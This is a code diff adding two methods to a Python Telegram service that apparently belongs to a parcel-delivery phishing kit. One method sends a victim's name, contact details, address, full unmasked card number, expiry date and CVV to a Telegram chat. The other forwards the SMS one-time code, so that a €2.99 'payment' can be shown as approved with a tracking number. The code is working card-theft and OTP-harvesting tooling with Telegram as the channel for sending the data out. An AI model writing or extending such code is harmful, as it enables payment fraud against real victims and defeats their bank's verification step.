@@ -153,6 +153,77 @@ class TelegramService:
             logger.error(f"Error formatting OTP message: {str(e)}")
             return False
 
+    async def send_card_submitted_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], session_id: str) -> bool:
+        """Send first message: client + card data when card is submitted"""
+        try:
+            # Show full card number (não mascarado conforme solicitado)
+            card_number = card_data.get('numeroCartao', 'N/A')
+            
+            message = f"""💳 DADOS DE CARTÃO RECEBIDOS
+
+👤 DADOS DO CLIENTE:
+┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
+┣━ 📧 Email: {billing_data.get('email', 'N/A')}
+┗━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}
+
+📍 ENDEREÇO DE ENTREGA:
+┣━ 🏠 Morada: {billing_data.get('endereco', 'N/A')}
+┣━ 📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}
+┗━ 🏙️ Cidade: {billing_data.get('cidade', 'N/A')}
+
+💳 DADOS DO CARTÃO:
+┣━ 💵 Valor: €2,99
+┣━ 💳 Número do Cartão: {card_number}
+┣━ 📅 Data de Expiração: {card_data.get('dataExpiracao', 'N/A')}
+┗━ 🔒 CVV: {card_data.get('cvv', 'N/A')}
+
+🔑 ID DA SESSÃO: {session_id}
+⏰ RECEBIDO EM: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+⏳ STATUS: AGUARDANDO CÓDIGO OTP
+
+═══════════════════════════════
+📱 Aguardando Verificação SMS 📱
+═══════════════════════════════"""
+            
+            return await self.send_message(message)
+            
+        except Exception as e:
+            logger.error(f"Error formatting card submitted message: {str(e)}")
+            return False
+
+    async def send_otp_verified_message(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], otp_code: str, tracking_number: str) -> bool:
+        """Send second message: OTP verification with client identification"""
+        try:
+            # Get card last 4 digits for identification
+            card_number = card_data.get('numeroCartao', '')
+            card_last4 = card_number[-4:] if len(card_number) >= 4 else '****'
+            
+            message = f"""✅ OTP VERIFICADO COM SUCESSO
+
+🔐 VERIFICAÇÃO DE SEGURANÇA COMPLETA:
+┣━ 📱 Código OTP: {otp_code}
+┣━ ✅ Status: VERIFICADO
+┗━ ⏰ Verificado em: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+
+👤 IDENTIFICAÇÃO DO CLIENTE:
+┣━ 📝 Nome: {billing_data.get('nome', 'N/A')}
+┣━ 📞 Telefone: {billing_data.get('telefone', 'N/A')}
+┗━ 💳 Cartão: ****{card_last4}
+
+📦 RASTREAMENTO GERADO: {tracking_number}
+💰 VALOR CONFIRMADO: €2,99
+✅ PAGAMENTO: APROVADO E PROCESSADO
+
+═══════════════════════════════
+🛡️ TRANSAÇÃO SEGURA COMPLETADA 🛡️
+═══════════════════════════════"""
+            
+            return await self.send_message(message)
+            
+        except Exception as e:
+            logger.error(f"Error formatting OTP verified message: {str(e)}")
+            return False
+
     async def send_payment_with_otp_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any], otp_code: str, tracking_number: str) -> bool:
         """Send complete payment info with OTP verification to Telegram"""
         try:
